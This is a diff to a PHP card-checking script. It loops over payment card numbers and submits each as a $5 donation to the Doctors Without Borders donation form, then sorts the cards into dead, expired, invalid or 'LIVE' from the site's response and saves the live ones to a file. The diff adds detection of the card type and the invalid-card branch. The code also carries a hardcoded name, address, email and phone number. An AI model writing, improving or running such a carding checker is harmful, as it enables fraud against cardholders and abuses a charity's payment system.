@@ -22,19 +22,23 @@ $headers[] = 'Content-Type: application/x-www-form-urlencoded';
   $scheme = $json['scheme'];
   $cate = $json['category'];
   $country = $json['bank']['name'];
-
-$gas = curl('https://donate.doctorswithoutborders.org/onetime.cfm', 'submitted=1&apple_pay_token=&apple_pay_paymentMethod=&apple_pay_billingContact=&apple_pay_shippingContact=&apple_pay_form_name=%2Fonetime.cfm&client_side_uuid=0B3A0FAA-D1C6-BB16-E15F8C3BECB09C6B&refer_type=&optimize_owls=&optimizelyhidden=&gift_type=onetime&gift_amount=other&other_gift_amount=5&card_type=2&credit_card_number='.$card.'&cvv='.$cvv.'&card_expiration_month='.$month.'&card_expiration_year='.$year.'&echeck_account_type=&echeck_routing_number=&echeck_account_number=&acknowledgment_type=H&honoree_first_name=&honoree_last_name=&honoree_first_name_2=&honoree_last_name_2=&ecard=ecard&ecardID=20&recipient_title=&recipient_first_name=&recipient_last_name=&recipient_email=&ecard_send_date=05%2F20%2F2020&send_copy=1&sender_name=&sender_email=&personal_message=&from_company=0&company_name=&title=Mr.&first_name=apri&last_name=amsyah&address_1=37+Ginna+B.+Drive&address_apt=jakarta&city=jakarta&state=55&zip=97220&country=1&email=dowerarts%40gmail.com&enews=&phone=%28125%29+421-3123', $headers);
+$lastCC = substr($cc_number, -4);
+                $typeCC = (substr($cc_number,0,1) == 4 ? "2" : (substr($cc_number,0,1) == 5 ? "1" : (substr($cc_number,0,1) == 6 ? "4" : (substr($cc_number,0,1) == 3 ? "3" : null ))));
+$gas = curl('https://donate.doctorswithoutborders.org/onetime.cfm', 'submitted=1&apple_pay_token=&apple_pay_paymentMethod=&apple_pay_billingContact=&apple_pay_shippingContact=&apple_pay_form_name=%2Fonetime.cfm&client_side_uuid=0B3A0FAA-D1C6-BB16-E15F8C3BECB09C6B&refer_type=&optimize_owls=&optimizelyhidden=&gift_type=onetime&gift_amount=other&other_gift_amount=5&card_type='.$typeCC.'&credit_card_number='.$card.'&cvv='.$cvv.'&card_expiration_month='.$month.'&card_expiration_year='.$year.'&echeck_account_type=&echeck_routing_number=&echeck_account_number=&acknowledgment_type=H&honoree_first_name=&honoree_last_name=&honoree_first_name_2=&honoree_last_name_2=&ecard=ecard&ecardID=20&recipient_title=&recipient_first_name=&recipient_last_name=&recipient_email=&ecard_send_date=05%2F20%2F2020&send_copy=1&sender_name=&sender_email=&personal_message=&from_company=0&company_name=&title=Mr.&first_name=apri&last_name=amsyah&address_1=37+Ginna+B.+Drive&address_apt=jakarta&city=jakarta&state=55&zip=97220&country=1&email=dowerarts%40gmail.com&enews=&phone=%28125%29+421-3123', $headers);
 $name = get_between($gas[1], "<li>", "</li>");
     if (strpos($gas[1], 'There was an error processing your card')) {
         echo "[$no] DIE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
     } else if (strpos($gas[1], 'Please enter a future expiration date within next 10 years')) {
         echo "[$no] Expired | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
+    } else if (strpos($gas[1], 'Please enter a valid credit card number')) {
+        echo "[$no] Card Not Valid | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
     } else {
         echo "[$no] LIVE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
         fwrite(fopen("cc-live.txt", "a"), "$email | $passwd | Plan : $planname | Last Expire : $lastexpire\n");
 }
     $no++;
 }
+
 function get_between($string, $start, $end) 
     {
         $string = " ".$string;
